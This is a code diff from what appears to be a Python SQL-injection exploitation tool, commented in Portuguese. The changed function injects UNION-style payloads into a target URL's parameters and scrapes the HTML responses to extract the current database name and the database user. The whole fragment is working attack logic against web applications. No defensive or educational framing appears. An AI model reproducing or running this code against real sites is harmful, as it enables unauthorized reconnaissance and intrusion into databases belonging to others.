@@ -83,13 +83,14 @@ def _serverVersion(target, cullumns_number):
                     break
     return server_fingerprint_info
 
-def _getDatabaseName(target, cullumns_number):
+def _getDatabaseNameU(target, cullumns_number):
     url_exploded = urlExplode(target)
     para = re.compile('(=)\w+')
     version = re.compile('^(\d+\.)?(\d+\.)?(\*|\d+)$')
     exploited_target_url = str()
     collumns_number_list = []
     columns = str()
+    database_user_fingerprint = {}
     if para.search(target):
         splited_para = para.search(target).group()
         for collumns_perc in range(1, cullumns_number+1): ## apenas preenche umma lista contendo as colunas
@@ -100,29 +101,40 @@ def _getDatabaseName(target, cullumns_number):
         columns = columns.replace("]", "")
         
         ## pega o nome so banco de dados actual
+        
         for collumns_perc in  range(1, cullumns_number+1):
             exploited_target_url = target.replace(splited_para, '=0'+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), DATABASE_NAME))
+            
             main_request = requests.get(url=exploited_target_url)
+            main_request_parsed = BeautifulSoup(main_request.content, "html.parser")
+            paragraph = main_request_parsed.find('div')
+            tag_link  = paragraph.find_all('a')
+            
+            if not 'mysql' in paragraph.text.lower():
+                paragraph = paragraph.find('p')
+                for tag_link_perc in tag_link:
+                    database_user_fingerprint[1] = paragraph.get_text()
+                break
             
         ## pegando o usuário actual do banco de dados
+        
         for collumns_perc in  range(1, cullumns_number+1):
             exploited_target_url = target.replace(splited_para, '=0'+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), GET_CURRENT_USER))
+            
             main_request = requests.get(url=exploited_target_url)
             main_request_parsed = BeautifulSoup(main_request.content, 'html.parser')
+            div = main_request_parsed.find('div')
             
-            if 'localhost' in main_request_parsed.text.lower():
-                div = main_request_parsed.find_all('div')
-                for div in div:
-                    link = main_request_parsed.find_all('a')
-                    for link in link:
-                        h = main_request_parsed.find_all('h3')       
-                        for h in h:
-                            print(h)
-                            
+            if 'localhost' in div.text.lower():
+                paragraph = div.find('p')
+                tag_link = paragraph.find_all('a')
+                for tag_link_perc in tag_link:
+                    if '@localhost' in paragraph.text.lower():
+                        database_user_fingerprint[2] = paragraph.get_text()
                 break
         
+    return database_user_fingerprint ## retorna um array contendo o nome do banco de dados e o usário actual
         
-                
                 
             
 '''
